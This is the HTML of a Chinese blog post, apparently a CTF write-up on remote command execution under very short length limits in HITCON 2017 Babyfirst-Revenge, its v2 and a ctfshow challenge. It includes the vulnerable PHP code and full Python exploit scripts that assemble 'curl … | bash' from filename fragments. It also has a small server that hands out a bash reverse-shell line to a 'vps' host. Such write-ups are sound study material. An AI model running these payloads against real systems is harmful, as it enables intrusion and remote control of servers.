@@ -1,0 +1,840 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/biaotou.png">
+  <link rel="icon" href="/img/biaotou.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="orange">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="参考链接 Funny Linux Tips – fushulingのblog ⁠‍‌‌‬‌﻿‬‬‌﻿⁠‍‌‬⁠⁠‍‌‍‌‍⁠‍极限命令执行6、7 WP - 飞书云文档 Ctfshow极限大挑战之三字节读取文件 在了解这个题目前，先学习一下hitcon2017的题目，babyfirst-revenge和v2，  hitcon2017  Babyfirst-Revenge 12345678910&amp;lt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="短字符长度RCE">
+<meta property="og:url" content="https://0ran9ewww.github.io/2025/08/28/ctfshow/%E6%9E%81%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C6&7/index.html">
+<meta property="og:site_name" content="0raN9e的笔记">
+<meta property="og:description" content="参考链接 Funny Linux Tips – fushulingのblog ⁠‍‌‌‬‌﻿‬‬‌﻿⁠‍‌‬⁠⁠‍‌‍‌‍⁠‍极限命令执行6、7 WP - 飞书云文档 Ctfshow极限大挑战之三字节读取文件 在了解这个题目前，先学习一下hitcon2017的题目，babyfirst-revenge和v2，  hitcon2017  Babyfirst-Revenge 12345678910&amp;lt">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/ctfshow/2025-08-28165259.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/ctfshow/2025-08-28165501.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/ctfshow/2025-08-28190910.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/ctfshow/2025-08-28193707.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/ctfshow/2025-08-28194239.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/ctfshow/2025-08-28194458.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/ctfshow/2025-08-28195241.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/ctfshow/2025-08-28201506.png">
+<meta property="article:published_time" content="2025-08-28T12:00:00.000Z">
+<meta property="article:modified_time" content="2025-08-28T12:54:20.225Z">
+<meta property="article:author" content="orange">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://0ran9ewww.github.io/images/ctfshow/2025-08-28165259.png">
+  
+  
+  
+  <title>短字符长度RCE - 0raN9e的笔记</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"0ran9ewww.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"mhU37D1jfBAPsc6SNIXmdLb0-gzGzoHsz","app_key":"z8mFsDgOSQqDw1luWGGbCaCR","server_url":"https://mhu37d1j.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>0raN9e的blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="短字符长度RCE"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-08-28 20:00" pubdate>
+          2025年8月28日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          14 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">短字符长度RCE</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年8月28日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p><strong>参考链接</strong></p>
+<p><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2022/11/07/%E6%9C%89%E8%B6%A3%E7%9A%84linux%E5%91%BD%E4%BB%A4/">Funny Linux Tips – fushulingのblog</a></p>
+<p><a target="_blank" rel="noopener" href="https://ctf-show.feishu.cn/wiki/QrKEwNVwlixLXrkxQLCcI7bDnQN">⁠‍‌‌‬‌﻿‬‬‌﻿⁠‍‌‬⁠⁠‍‌‍‌‍⁠‍极限命令执行6、7 WP - 飞书云文档</a></p>
+<p><a target="_blank" rel="noopener" href="https://baozongwi.xyz/p/ctfshow-extreme-challenge-3-byte-file-read/">Ctfshow极限大挑战之三字节读取文件</a></p>
+<p>在了解这个题目前，先学习一下hitcon2017的题目，babyfirst-revenge和v2，</p>
+<h1 id="hitcon2017"><a class="markdownIt-Anchor" href="#hitcon2017"></a> hitcon2017</h1>
+<h2 id="babyfirst-revenge"><a class="markdownIt-Anchor" href="#babyfirst-revenge"></a> Babyfirst-Revenge</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&#x27;/www/sandbox/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;orange&quot;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    @<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) &lt;= <span class="hljs-number">5</span>) &#123;<br>        @<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;reset&#x27;</span>])) &#123;<br>        @<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;/bin/rm -rf &#x27;</span> . <span class="hljs-variable">$sandbox</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure>
+<p>这里先创建了文件夹<code>$sandbox</code>,然后修改了当前的目录，然后对于输入的内容cmd有一个长度的限制</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/orangetw/My-CTF-Web-Challenges/tree/master/hitcon-ctf-2017/babyfirst-revenge">My-CTF-Web-Challenges/hitcon-ctf-2017/babyfirst-revenge at master · orangetw/My-CTF-Web-Challenges</a></p>
+<p>标准的思路直接去看orange神的exp,这边现在本地尝试一下内容</p>
+<p>已知在linux里面可以用<code>\</code>进行简单的绕过</p>
+<p><img src="/../../images/ctfshow/2025-08-28165259.png" srcset="/img/loading.gif" lazyload alt="2025-08-28165259"></p>
+<p>其次的话执行sh会直接执行文本里面的内容</p>
+<p><img src="/../../images/ctfshow/2025-08-28165501.png" srcset="/img/loading.gif" lazyload alt="2025-08-28165501"></p>
+<p>即使报错了，对应的命令还是会继续执行下去，那么基础的知识差不多就这些。</p>
+<p>那么这题的流程大概就是<code>打开冰箱---&gt;把大象塞进去---&gt;把冰箱关上</code></p>
+<p>那么exp是</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote  <span class="hljs-comment"># Python 3.x</span><br><br>payload = [<br>    <span class="hljs-string">r&#x27;&gt;ls\\&#x27;</span>,<br>    <span class="hljs-string">r&#x27;ls&gt;_&#x27;</span>,<br>    <span class="hljs-string">r&#x27;&gt;\ \\&#x27;</span>,<br>    <span class="hljs-string">r&#x27;&gt;-t\\&#x27;</span>,<br>    <span class="hljs-string">r&#x27;&gt;\&gt;g&#x27;</span>,<br>    <span class="hljs-string">r&#x27;ls&gt;&gt;_&#x27;</span>,<br><br>    <span class="hljs-string">r&#x27;&gt;sh\\&#x27;</span>,<br>    <span class="hljs-string">r&#x27;&gt;ba\\&#x27;</span>,<br>    <span class="hljs-string">r&#x27;&gt;\|\\&#x27;</span>,<br>    <span class="hljs-string">r&#x27;&gt;8\\&#x27;</span>,<br>    <span class="hljs-string">r&#x27;&gt;20\\&#x27;</span>,<br>    <span class="hljs-string">r&#x27;&gt;2.\\&#x27;</span>,<br>    <span class="hljs-string">r&#x27;&gt;22\\&#x27;</span>,<br>    <span class="hljs-string">r&#x27;&gt;3.\\&#x27;</span>,<br>    <span class="hljs-string">r&#x27;&gt;8\\&#x27;</span>,<br>    <span class="hljs-string">r&#x27;&gt;7.\\&#x27;</span>,<br>    <span class="hljs-string">r&#x27;&gt;4\\&#x27;</span>,<br>    <span class="hljs-string">r&#x27;&gt;\ \\&#x27;</span>,<br>    <span class="hljs-string">r&#x27;&gt;rl\\&#x27;</span>,<br>    <span class="hljs-string">r&#x27;&gt;cu\\&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;sh _&#x27;</span>,<br>    <span class="hljs-string">&#x27;sh g&#x27;</span>,<br>]<br><br>r = requests.get(<span class="hljs-string">&#x27;http://ip/?reset=1&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload:<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(i) &lt;= <span class="hljs-number">5</span><br>    r = requests.get(<span class="hljs-string">&#x27;http://ip/?cmd=&#x27;</span> + quote(i))<br>    <span class="hljs-built_in">print</span>(i)<br>    sleep(<span class="hljs-number">0.2</span>)<br><br></code></pre></td></tr></table></figure>
+<p>然后这个是网页的内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> http.server <span class="hljs-keyword">import</span> HTTPServer, BaseHTTPRequestHandler<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CommandHandler</span>(<span class="hljs-title class_ inherited__">BaseHTTPRequestHandler</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_GET</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.send_response(<span class="hljs-number">200</span>)<br>        <span class="hljs-comment"># 直接返回纯文本</span><br>        <span class="hljs-variable language_">self</span>.send_header(<span class="hljs-string">&#x27;Content-type&#x27;</span>, <span class="hljs-string">&#x27;text/plain; charset=utf-8&#x27;</span>)<br>        <span class="hljs-variable language_">self</span>.end_headers()<br>        <span class="hljs-comment"># 输出反弹 shell 命令</span><br>        <span class="hljs-variable language_">self</span>.wfile.write(<span class="hljs-string">b&quot;bash -i &gt;&amp; /dev/tcp/vps/5566 0&gt;&amp;1\n&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># 监听 0.0.0.0:80</span><br>    server_address = (<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">80</span>)<br>    httpd = HTTPServer(server_address, CommandHandler)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Serving on port 80...&quot;</span>)<br>    httpd.serve_forever()<br></code></pre></td></tr></table></figure>
+<p>上面代码大致的意思就是先输入了<code>ls -t&gt;g</code>然后接下来的顺序就是构造了一个<code>curl ip |bash</code>的内容，</p>
+<p>分别执行<code>sh _</code>，<code>sh g</code>，执行第一个_文件是为了执行里面的内容<code>ls -t&gt;g</code></p>
+<h2 id="babyfirst-revenge-v2"><a class="markdownIt-Anchor" href="#babyfirst-revenge-v2"></a> Babyfirst-Revenge-V2</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&#x27;/var/www/html/sandbox/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;orange&quot;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    @<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) &lt;= <span class="hljs-number">4</span>) &#123;<br>        @<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;reset&#x27;</span>])) &#123;<br>        @<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;/bin/rm -rf &#x27;</span> . <span class="hljs-variable">$sandbox</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure>
+<p>在上面的基础上又少了一个长度，<code>ls&gt;&gt;_</code>在此基础上不能用了，长度不够了，但思路大致还是这样,需要反弹shell</p>
+<p><img src="/../../images/ctfshow/2025-08-28190910.png" srcset="/img/loading.gif" lazyload alt="2025-08-28190910"></p>
+<p>可以看到<code>*</code>是可以执行命令的，linux排序是按字母进行排序的，如上图所示</p>
+<p>这里参照wp使用的是rev，首先构造<code>g&gt; ht- sl</code>,之后利用*v这种任意字符来执行命令进行逆向，最后拼接执行命令</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php">import requests<br><span class="hljs-keyword">from</span> time import sleep<br><span class="hljs-keyword">from</span> urllib.parse import quote   <span class="hljs-comment"># Python3</span><br><br>payload = [<br>    <span class="hljs-string">&#x27;&gt;dir&#x27;</span>,<br>    <span class="hljs-string">&#x27;&gt;sl&#x27;</span>,<br>    <span class="hljs-string">&#x27;&gt;g\\&gt;&#x27;</span>,<br>    <span class="hljs-string">&#x27;&gt;ht-&#x27;</span>,<br>    <span class="hljs-string">&#x27;*&gt;v&#x27;</span>,<br><br>    <span class="hljs-comment"># reverse file &quot;v&quot; to file &quot;x&quot;, content &quot;ls -th &gt;g&quot;</span><br>    <span class="hljs-string">&#x27;&gt;rev&#x27;</span>,<br>    <span class="hljs-string">&#x27;*v&gt;x&#x27;</span>,<br><br>    <span class="hljs-comment"># generate &quot;curl orange.tw|python;&quot;</span><br>    <span class="hljs-string">&#x27;&gt;\\;\\&#x27;</span>,<br>    <span class="hljs-string">&#x27;&gt;on\\&#x27;</span>,<br>    <span class="hljs-string">&#x27;&gt;th\\&#x27;</span>,<br>    <span class="hljs-string">&#x27;&gt;py\\&#x27;</span>,<br>    <span class="hljs-string">&#x27;&gt;\\|\\&#x27;</span>,<br>    <span class="hljs-string">&#x27;&gt;tw\\&#x27;</span>,<br>    <span class="hljs-string">&#x27;&gt;e.\\&#x27;</span>,<br>    <span class="hljs-string">&#x27;&gt;ng\\&#x27;</span>,<br>    <span class="hljs-string">&#x27;&gt;ra\\&#x27;</span>,<br>    <span class="hljs-string">&#x27;&gt;o\\&#x27;</span>,<br>    <span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br>    <span class="hljs-string">&#x27;&gt;rl\\&#x27;</span>,<br>    <span class="hljs-string">&#x27;&gt;cu\\&#x27;</span>,<br><br>    <span class="hljs-comment"># got shell</span><br>    <span class="hljs-string">&#x27;sh x&#x27;</span>,<br>    <span class="hljs-string">&#x27;sh g&#x27;</span>,<br>]<br><br>r = requests.<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;http://ip/?reset=1&#x27;</span>)<br><span class="hljs-keyword">for</span> i in payload:<br>    assert <span class="hljs-title function_ invoke__">len</span>(i) &lt;= <span class="hljs-number">4</span><br>    r = requests.<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;http://ip/?cmd=&#x27;</span> + <span class="hljs-title function_ invoke__">quote</span>(i))<br>    <span class="hljs-keyword">print</span>(i)<br>    <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">0.1</span>)<br><br></code></pre></td></tr></table></figure>
+<h1 id="ctfshow"><a class="markdownIt-Anchor" href="#ctfshow"></a> ctfshow</h1>
+<h2 id="极限命令执行6"><a class="markdownIt-Anchor" href="#极限命令执行6"></a> 极限命令执行6</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf_show&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf_show&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$ctfshow</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$ctfshow</span>) &lt;= <span class="hljs-number">3</span>) &#123;<br>        <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$ctfshow</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p><img src="/../../images/ctfshow/2025-08-28193707.png" srcset="/img/loading.gif" lazyload alt="2025-08-28193707"></p>
+<p>这里flag直接在这里了，那么就要尝试读出内容</p>
+<p>但是这里还是比较畸形的，只给了三长度，先去<code>/bin</code>看一下内容</p>
+<p>我们知道<code>*</code>读取文件然后执行，那么命令</p>
+<p><img src="/../../images/ctfshow/2025-08-28194239.png" srcset="/img/loading.gif" lazyload alt="2025-08-28194239"></p>
+<p>[a-f]的命令可以操作flag.php和index.php，命令开头为[g-i]的可以操作index.php</p>
+<p>这里可以看到下面的hd<img src="/../../images/ctfshow/2025-08-28194458.png" srcset="/img/loading.gif" lazyload alt="2025-08-28194458"></p>
+<p>那么解题的思路就是可以尝试把flag的内容输入到index.php里面，然后再读取index.php的内容</p>
+<p><img src="/../../images/ctfshow/2025-08-28195241.png" srcset="/img/loading.gif" lazyload alt="2025-08-28195241"></p>
+<p>这里存在<code>sleep(1)</code>有时间进行短暂的缓存，由于时间限制需要Race Condition，我们写个脚本(参考包子哥的)</p>
+<p><img src="/../../images/ctfshow/2025-08-28201506.png" srcset="/img/loading.gif" lazyload alt="2025-08-28201506"></p>
+<p>由于一旦覆盖了之后靶机原始的index.php不能执行了，所以脚本是一次性的</p>
